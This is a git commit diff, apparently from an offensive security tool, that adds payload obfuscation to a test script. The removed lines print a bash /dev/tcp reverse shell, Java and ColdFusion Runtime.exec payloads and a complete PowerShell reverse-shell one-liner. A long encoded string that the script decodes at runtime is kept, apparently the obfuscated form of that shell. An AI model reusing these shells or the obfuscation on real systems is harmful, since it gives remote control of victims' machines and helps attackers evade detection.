1fd8c56dda8196643809c642900d4ba4581758b7
gris <gris@localhost.localdomain>
2024-06-25 17:46:00 -0400

    herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)

--- modules/test_lazyencoder_decoder.py
+++ modules/test_lazyencoder_decoder.py
@@ -16,10 +16,10 @@ lhost = rhost = '127.0.0.1'
 cmd = 'ls'
 # Ejemplo con una lista de cadenas
 payloads = {
-    "php1": "bash -i >& /dev/tcp/{lhost}/31337 0>&1",
-    "php2": "<?php echo($_GET['apellido']); ?>",
-    'Java': f"Runtime.getRuntime().exec(echo 'hola mundo')",
-    'ColdFusion': f"#CreateObject(\"java\", \"java.lang.Runtime\").getRuntime().exec(variables.cmd)#"
+    "php1": "asdfg",
+    "php2": "asfsdf",
+    'Java': "asfdsafg')",
+    'ColdFusion': "asfdgdsfg"
 }
 
 # Ofuscar el diccionario de cadenas
@@ -31,20 +31,6 @@ decoded_dict = {key: ed.decode(value, shift_value, substitution_key) for key, va
 print(f"Decoded dict: {decoded_dict}")
 callback_ip = '127.0.0.1'
 callback_port = '4444'
-# Construye el comando de reverse shell
-command = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command " \
-                  "New-Object System.Net.Sockets.TCPClient('{callback_ip}',{callback_port});" \
-                  "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};" \
-                  "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;" \
-                  "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" \
-                  "$sendback = (iex $data 2>&1 | Out-String );" \
-                  "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';" \
-                  "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" \
-                  "$stream.Write($sendbyte,0,$sendbyte.Length);" \
-                  "$stream.Flush()}}; $client.Close()"
-
-com = ed.encode(command, shift_value, substitution_key)
-print(f"c : {com}")
 
 command2 = "hU93GCXcyNAgeAHyHp9XNQ1Mi25MGJ1LLCouNJPsgwDrYCvoWfGQhVImq3KnQIQtiB1kztVuWkC3ZX9pfaYhkHPWcES0CU0zHpT0QzQtF2hobORiYCUVE2vwEK50RHr7W2KgeEQmM2rmfLE9Qdl7W2KgeEQmM2rmhU9wkM0sMfWngFQqMZ0nUGDiF2lsXD50OikqrIL0haYfiXusM1ywhVYqK11kOUM5kLJcGK0uPA4zBmS1RnY8QCh7KO19R3ktoZvsPQjihXO9GJWngFQqMZ0bZaYfGHunWuq0CVTxWGYzNQUglCFoaf5ACU5srJewPGDrirIjKJq7hxzpNJD0DGD9PHvRXEhhW2QvNZL0NQ1SlCPoRtKhCQIYsAL0EK0sCLJ4bJ5PX0UOGXTbD29ihB5qIZ5VCVYYrKHwgafmQLX5bNAnOBHxXJiwTmUxGB5nWtKxdwH9WFfwELjeQLFkbNJuPh4rAVZ8NS91kH1WbOOdekjlYWqrh2YsGLXkW2xmLAH9WFPgEK5iFrTmyfFfLAkVIbYuNQveRMP3XJpiXEM0oFYyNQf-PHq7HOSzekYnsAPsNR0eRKh0XEm0OkCzM29rfK5lEYc6OCSRVSruZnbsiSM5kLJcIJWnCU5pMpDqfnLnVdFcbOOzBU0zJ3HwiUXmQMBoztWwhVYqZGYzOVQjirFlcEWzOieqppb0fQn7QMB0atAveQ5LpKTgfQjnmC07GJWxeEsqpqObV2atj2IrIX=="
 command = ed.decode(command2, shift_value, substitution_key)
